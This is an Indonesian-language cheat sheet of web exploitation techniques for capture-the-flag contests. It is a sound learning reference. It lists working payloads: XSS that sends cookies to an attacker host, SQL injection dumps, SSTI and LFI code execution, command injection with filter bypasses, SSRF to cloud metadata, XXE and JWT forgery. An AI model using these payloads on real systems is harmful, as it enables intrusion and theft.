# WEB — Web Exploitation

> Kekuatan kamu. Pakai **Burp** buat intercept/replay tiap request (Proxy → Repeater).

## Triage / recon
```bash
curl -sI http://host:port                 # header, Server, Set-Cookie, framework
curl -s http://host:port | less           # HTML, komentar, JS source
curl http://host:port/robots.txt http://host:port/sitemap.xml
curl http://host:port/.git/HEAD           # source leak (lihat bawah)
ffuf -u http://host:port/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403
```
Selalu: **View Source**, baca **JS** (endpoint, API key, logic client), cek **Set-Cookie** (flag httpOnly?), **DevTools → Network**, header response (framework, CSP).
Source disclosure: `.git/` (→ `git-dumper`), `.env`, backup (`index.php~`, `.bak`, `.swp`), `php://filter` (LFI).

## SQL Injection
Deteksi: `'`, `"`, `)` → error / beda response. `' OR '1'='1' -- -`. `admin'-- -`.
```sql
-- cari jumlah kolom:
' ORDER BY 5-- -
-- union (sesuaikan kolom):
' UNION SELECT 1,2,3,4,5-- -
-- enumerasi (MySQL):
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(user,0x3a,pass),3 FROM users-- -
```
- **Blind boolean**: `' AND 1=1-- -` vs `' AND 1=2-- -`.
- **Blind time**: `' AND SLEEP(5)-- -` (MySQL) / `pg_sleep(5)` (PG) / `WAITFOR DELAY '0:0:5'` (MSSQL).
- **Bypass filter**: comment `/**/`, case `UnIoN`, `||` concat, hex `0x61`, `CHAR()`, double-encode.
- Auto (kalau diizinin): `sqlmap -u "http://host/?id=1" --batch --dbs --dump` ; untuk POST/cookie pakai `-r req.txt`.
- **sqlite** (file DB): `sql_master`, `' UNION SELECT sql,2 FROM sqlite_master-- -`.

## NoSQL injection (Mongo)
```
username[$ne]=&password[$ne]=        # auth bypass
username[$regex]=^a                  # brute char
```

## XSS (sering buat curi cookie admin bot)
```html
<script>fetch('//ATTACKER/?c='+document.cookie)</script>
<img src=x onerror="fetch('//ATTACKER/?c='+document.cookie)">
<svg onload="location='//ATTACKER/?c='+document.cookie">
"><script>new Image().src='//ATTACKER/?'+document.cookie</script>
```
- **Reflected**: payload di param kepantul ke HTML tanpa sanitasi.
- **Stored**: payload kesimpen (komentar, profil) → kena korban/admin.
- **Admin bot**: report URL → bot buka pakai cookie admin → exfil. Catatan: bot sering cuma boleh akses origin sendiri (SOP), jadi exfil lewat endpoint internal / stored.
- **Bypass filter**: case (`oNeRror`), tanpa kurung (`<svg onload=alert`1`>`), event handler lain, HTML entity, `javascript:` URI, template literal.
- **CSP bypass**: cari `unsafe-inline`, JSONP endpoint, `nonce` bocor, base-uri.

## SSTI (template injection)
Deteksi: `{{7*7}}`→`49`? `${7*7}`? `<%= 7*7 %>`? `#{7*7}`?
```python
# Jinja2 RCE:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}   # cari Popen index
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}
# Twig (PHP): {{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}
```
Mapping engine di PayloadsAllTheThings → "Server Side Template Injection".

## LFI / Path Traversal / RFI
```
?page=../../../../etc/passwd
?page=../../../../flag
?file=php://filter/convert.base64-encode/resource=index.php   # baca source PHP
?page=php://input  (POST: <?php system('id'); ?>)             # RCE
?page=data://text/plain;base64,PD9waHA...                     # RCE
?page=/var/log/apache2/access.log                             # log poisoning via UA
```
- Null byte (`%00`) di PHP lama. Wrapper `expect://`, `zip://`.

## Command Injection
```
8.8.8.8; cat /flag
8.8.8.8 | cat /flag
8.8.8.8 && cat /flag
`cat /flag`   $(cat /flag)
8.8.8.8%0acat /flag        (newline)
```
- Filter spasi: `cat${IFS}/flag`, `{cat,/flag}`, `cat</flag`.
- Filter `/`: `cat ${HOME:0:1}flag`. Filter kata: `c'a't`, `ca\t`.
- Blind → out-of-band (DNS/HTTP) atau time-based.

## SSRF
```
?url=http://localhost/admin
?url=http://127.0.0.1:port/
?url=http://169.254.169.254/latest/meta-data/   (cloud metadata)
# bypass filter: http://127.1 , http://[::1] , decimal IP, redirect, http://localhost.attacker.com
```

## XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
<root>&xxe;</root>
<!-- OOB / blind: SYSTEM "http://ATTACKER/?d=..." -->
```

## Insecure Deserialization
- **PHP**: `unserialize()` user input → POP chain (`__wakeup`/`__destruct`). Tool: PHPGGC.
- **Python**: `pickle.loads` → `__reduce__` RCE. **Node**: `node-serialize`. **Java**: ysoserial.

## JWT
```bash
python3 jwt_tool/jwt_tool.py <token> -T              # tamper interaktif
python3 jwt_tool/jwt_tool.py <token> -C -d wordlist  # brute HS256 secret
```
- `alg:none` bypass (hapus signature).
- **Key confusion** RS256→HS256: sign pakai public key sebagai HMAC secret.
- `kid` injection (path traversal / SQLi di kid).
- `jku`/`x5u` nunjuk ke JWKS attacker.

## Auth logic / IDOR / race
- **IDOR**: ganti `id=`, `user=`, UUID → akses resource orang lain.
- **Logic flaw**: bandingin gimana token/validasi **DIBUAT** vs **DICEK** (kasus KRS: `course_id` ikut dibikin tapi gak ikut dicek saat enroll → token mata kuliah A dipakai enroll B).
- **Mass assignment**: tambah field (`"isAdmin":true`) di body JSON.
- **Race condition**: kirim banyak request paralel (kupon, saldo) — Burp Turbo Intruder / `httpx` async.

## Gotcha penting
- **Content-Type**: body JSON gak kebaca kalau header salah → set `application/json` (kasus KRS "Course not found").
- Coba **semua HTTP method** (GET/POST/PUT/DELETE/PATCH), header custom (`X-Forwarded-For`, `X-Original-URL`), cookie flag.
- Cek **race antar-field**, nilai negatif, integer overflow di harga/kuota.

## Checklist stuck
- [ ] Baca source HTML+JS, komentar, endpoint tersembunyi, `.git`/backup?
- [ ] Semua param dicoba inject (SQLi/NoSQL/SSTI/cmd/LFI/SSRF/XXE)?
- [ ] Cookie/JWT bisa ditamper?
- [ ] Logic: bandingin create vs verify; coba IDOR/mass-assign/race.
- [ ] Content-Type / method / header bener?
- [ ] Ada admin bot → XSS exfil.
